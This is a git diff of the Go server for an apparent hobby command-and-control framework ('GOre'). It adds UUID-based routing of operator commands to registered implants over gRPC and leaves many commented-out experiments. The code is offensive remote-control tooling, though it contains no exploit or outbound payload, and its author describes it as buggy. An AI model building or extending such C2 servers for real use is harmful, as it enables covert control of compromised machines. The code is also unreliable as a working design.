@@ -2,7 +2,6 @@ package main
 
 import (
 	"context"
-	"errors"
 	"fmt"
 	"gore/grpcapi" //the pain to get this to work was immense. Golang needs to slow the fuck down and stop depreciating packages.
 	"log"
@@ -25,15 +24,16 @@ type implantServer struct {
 // we need to have a seperate admin struct for handling admin commands, that way we don't run OS commands on the server, only on clients
 type adminServer struct {
 	work, output chan *grpcapi.Command //thread for admin services
-	//uuid         chan *grpcapi.Registration //myabe??
+	target_uuid  string
 }
 
 // we impliment these sepertaly to keep them mutally exclusive. Each one has a a channel for sending/recieving work and command output.
 func NewImplantServer(work, output chan *grpcapi.Command) *implantServer { //returns a pointer to implant server
 	s := new(implantServer) //instantiate a struct of implantServer, name it s
-	s.work = work           //assign work
-	s.output = output       //assign output
-	return s                //return the struct.
+	//s.implant_work = implant_work //assign work
+	s.work = work     //assign work
+	s.output = output //assign output
+	return s          //return the struct.
 }
 
 // similar to instantiating an inplant server
@@ -48,20 +48,66 @@ func NewAdminServer(work, output chan *grpcapi.Command) *adminServer { //returns
 // in a RESTful API. it's a bit more complex, but should pay off in the end. Also, according to Docs for context, it is a bad idea/not allowed to pass in NIL for a context value,
 // nessecitating the need for our own "Empty" message value.
 // define the methods of our structs. Thats what the pointers to structs mean prior to the function definitions. it's OOP baby.
-func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) { //this acts as basically a polling mechanism, asking for work.
+
+// TODO: implant UUID selection should occur here. It seems that once a new implant is registered, that is the one that fetches.
+// we need to basically enumerate through every implant we have to give them a chance to check for thier work.
+func (s *implantServer) SendCommand(ctx context.Context, implant_uuid *grpcapi.Registration) (*grpcapi.Command, error) { //this acts as basically a polling mechanism, asking for work.
 	var cmd = new(grpcapi.Command) //instantiate a new command from the grpcapi.
-	select {                       //switch statement
+	//var cmd2 = new(grpcapi.Command)
+	//get the tageted implant by uuid
+	req_uuid := implant_uuid.GetUuid()
+	fmt.Println("[+] implant requesting's uuid: ", req_uuid)
+	//cmd2 = <-s.work
+	//fmt.Println("[+] cmd2: ", cmd2)
+	//_, implant := implant_map[req_uuid]
+	fmt.Println("[+] cmd uuid: ", cmd.Uuid)
+	//this is a bit complex...
+	//if it's blocking, why not put it in its own goroutine?
+	//this is the UUID of whoever registered last...
+	/*TODO: maybe ditch the select statement in it's entrity and instead do a for-loop with goroutines to make sure that the command
+	/is shared between channel connections?*/
+	//iterate through the entire map
+	//check for a match
+	/*if implant_map[req_uuid] == *s {
+		cmd, ok := <-s.implant_work
+		//assert ok
+		if ok {
+			return cmd, nil
+
+		} else {
+			fmt.Println("[-] cmd not OK")
+		}
+	}
+	return cmd, nil*/
+
+	//if cmd.Uuid == s.uuid {
+	//for {
+	select { //switch statement
 	// <- is passing a value from a channel to a reference, similar to dequeing from a queue of jobs for multithreads/goroutines
 	//this is also nonblocking and will run the default case if there is nothing to do.
-	case cmd, ok := <-s.work:
-		if ok { //check if command was successful
-			return cmd, nil
+
+	case cmd, ok := <-s.work: //used to be <-s.work
+		//this certainly made it faster...
+		//implant_map[cmd.Uuid].implant_work <- cmd
+		if cmd.Uuid == req_uuid { //check if command was successful
+			if ok {
+				fmt.Println("[+] CMD: ", cmd)
+				fmt.Println("[+] CMD UUID: ", cmd.Uuid)
+				return cmd, nil
+			}
+		} else {
+			fmt.Println("[+] added the work back to the channel")
+			s.work <- cmd
 		}
-		return cmd, errors.New("[-] Channel closed.") //otherwise, return an error that the channel closed
+		//this NEVER happens.
+		//return cmd, errors.New("[!] Channel closed.") //otherwise, return an error that the channel closed
 	default:
 		// if all the above fails, then no work is present
 		return cmd, nil
 	}
+	//break
+	//}
+	return cmd, nil
 }
 
 // this command will push the command onto the queue or the output channel/goroutine
@@ -71,9 +117,7 @@ func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command)
 }
 
 // TODO:
-// edit the below function (I believe) to track and index for UUIDs. DONE!!!!
-//next thing that needs to be done is to default to sending the comand to ALL implants, or have some better default case then just failure.
-//for now, we have multiple implants, and can access each as we wish.
+// There is some multi-threading or implant managment issues that is leading to undefined behaviour. This cannot continue.
 
 // running of a command for our admin component; we push it to the Goroutine queue and have it be handled by multithreading.
 func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
@@ -82,39 +126,66 @@ func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*gr
 
 	//grab UUID from cmd
 	uuidstr := cmd.GetUuid()
+	//check key existance
+	implant, key := implant_map[uuidstr]
+	fmt.Println("[+] requested implant's uuid: ", implant.uuid)
+	//assume that a UUID was given by an operator
+	if key {
+		//functionality for targeted implant bahaviour
+		go func() {
+			implant_map[uuidstr].work <- cmd //used to be s not implant
+			//grab from the implant_map data structure
+			//implant_map[uuidstr].work <- cmd
+		}()
+		//assign command output to result, ie telling us if it ran properly.
+		res = <-implant_map[uuidstr].output //used to be s not implant
+		//res = <-implant_map[uuidstr].output
+	} else {
+		//not the best solution for now
 
-	go func() {
-		//s.work <- cmd
-		//try grabbing from the implant_map data structure
-		implant_map[uuidstr].work <- cmd
-	}()
-	//assign command output to result, ie telling us if it ran properly.
-	//res = <-s.output
-	res = <-implant_map[uuidstr].output
+		//res = error
+		/*for key, _ := range implant_map {
+			go func() {
+				implant_map[key].work <- cmd
+			}()
+			res = <-implant_map[key].output //no idea if this works
+		}*/
+		fmt.Println("[-] UUID was not found/not supplied.")
+	}
+	//either way, return the output to the operator
 	return res, nil
 }
 
 // handle UUID
 func (s *implantServer) RegisterNewImplant(ctx context.Context, uuid_result *grpcapi.Registration) (*grpcapi.Empty, error) {
 	//var res *grpcapi.Registration
-	res := uuid_result.GetUuid()
-	//debug print statement to server
-	uuidstr := fmt.Sprintf("%s", res)
-	fmt.Println(res)
+	uuidstr := uuid_result.GetUuid()
+	//work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
+	//mplant := NewImplantServer(work, output)
+
 	fmt.Println(uuidstr)
 	fmt.Println("[+] Recieved new registration request")
 	//add uuid to the list that we have.
 	//uuid_list = append(uuid_list, uuidstr)
-	s.uuid = uuidstr
+	s.uuid = uuidstr //IDK if this is needed.
 	//implant_list = append(implant_list, *s)
-	implant_map[uuidstr] = *s
-	//try printing the data to make sure it actually went the wqay that was expected
+	//first, check if key is in the map
+	_, key := implant_map[uuidstr]
+	if !key {
+
+		implant_map[uuidstr] = *s
+		//this may be uneeded.
+	} else {
+		fmt.Println("[:] Duplicate registration request recieved, updating records.")
+		implant_map[uuidstr] = *s
+	}
+	//debug printing for server admin
 	fmt.Println("[+] Printing lists of registerd UUID's and implants:")
-	//fmt.Printf("%+q\n", uuid_list)    //works alright
-	fmt.Printf("%+q\n", implant_map)
+	//fmt.Printf("%+q\n", implant_map)
 	fmt.Println("--------------------------------------------")
 	for key, value := range implant_map {
 		fmt.Println(key, value)
+		//fmt.Println("[+] sanity check: ", implant_map[key] == *s) //evaluates as expected, for now. Each one is different and self == self!
 	}
 	//return nil as I don't want to return something to the client.
 	return &grpcapi.Empty{}, nil
@@ -133,25 +204,21 @@ func main() {
 		err                            error                 //errors
 		opts                           []grpc.ServerOption   //server options
 		work, output                   chan *grpcapi.Command //work and output goroutines
+		//implant_work                   chan *grpcapi.Command
 	)
 
-	//TODO: create array for storing UUID's and another for a client list
-	//empty array for UUID storage
-	//uuid_list := []string{}
-	//empty slice of implant server structs.
-	//var implant_list = []implantServer{}
 	//TODO: load file and read TLS data
 
 	//create channels for passing input and output commands to implant and admin services
 	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
 	//instantiate a new implant to act as a device client and an admin server. We're doing this on the same channel, so IPC between them is shared on the same goroutine.
-	implant := NewImplantServer(work, output)
+	//implant := NewImplantServer(work, output)
 	admin := NewAdminServer(work, output) //both share the same work and output
 	//open and bind port 5000 on localhost on the server to listen to commands over tcp, check if nil and log a fatal error if so
-	if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 5000)); err != nil {
+	/*if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 5000)); err != nil {
 		fmt.Println("[-] implantListener has failed.")
 		log.Fatal(err)
-	}
+	}*/
 	//do the same for an admin server, with a differnet port of course
 	if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
 		fmt.Println("[-] adminListener has failed.")
@@ -159,14 +226,26 @@ func main() {
 	}
 	fmt.Println("[+] GOre server has started successfully.")
 	//the "..." operator implies an input with a variable number of inputs, kinda like explicit function overloading. We declare that opts might have more variables associated with them than we specify.
-	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)
+	grpcAdminServer := grpc.NewServer(opts...)
+	//grpcImplantServer := grpc.NewServer(opts...)
 	//register the servers. Do note we never explicitly defined these, protoc did. By compiling our .proto file, it gave us Golang functions for fri.
-	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
+	//grpcapi.RegisterImplantServer(grpcImplantServer, implant)
+
 	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
 	//use goroutines to serve implants
 	go func() {
+		//work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
+		//implant_work = make(chan *grpcapi.Command)
+		//instantiate a new implant to act as a device client and an admin server. We're doing this on the same channel, so IPC between them is shared on the same goroutine.
+		implant := NewImplantServer(work, output)
+		if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 5000)); err != nil {
+			fmt.Println("[-] implantListener has failed.")
+			log.Fatal(err)
+		}
+		grpcImplantServer := grpc.NewServer(opts...)
+		grpcapi.RegisterImplantServer(grpcImplantServer, implant)
+
 		grpcImplantServer.Serve(implantListener)
-		//grpcapi.RegisterImplantServer(grpcImplantServer, implant) //maybe??????
 	}()
 	//admin server is not multithreaded, only one is allowed.
 	grpcAdminServer.Serve(adminListener)
